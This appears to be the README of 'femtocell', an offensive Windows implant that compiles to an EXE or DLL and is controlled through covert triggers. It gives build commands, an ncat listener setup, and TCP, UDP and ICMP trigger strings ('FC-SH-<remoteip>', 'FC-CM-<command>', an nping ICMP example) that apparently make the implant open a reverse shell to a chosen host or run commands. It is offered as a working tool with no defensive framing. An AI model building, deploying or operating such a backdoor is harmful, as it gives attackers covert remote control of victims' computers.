# femtocell
This was supposed to be a "Modular C2 Framework"
Now it's not.
It's way cooler now though. Trust me.

## Building
Executable: `x86_64-w64-mingw32-gcc femtocell.c process.c -lws2_32 -o femtocell.exe`

DLL: `x86_64-w64-mingw32-gcc femtocell.c process.c -D DLL -shared -lws2_32 -o femtocell.dll`

## Usage
### TCP
`ncat -lvp 2628`

`ncat -p 6006 <ip> <port>`
`> FC-SH-<remoteip>`
`> FC-CM-<command>`

### UDP
`ncat -lvp 2628`

`ncat -p 6006 <ip> <port>`
`> FC-SH-<remoteip>`
`> FC-CM-<command>`

### ICMP
`sudo nping 192.168.183.152 --icmp --data-string "FC-SH-192.168.10.162 " -c 1 --icmp-code 1`

**include a character after the IP address**
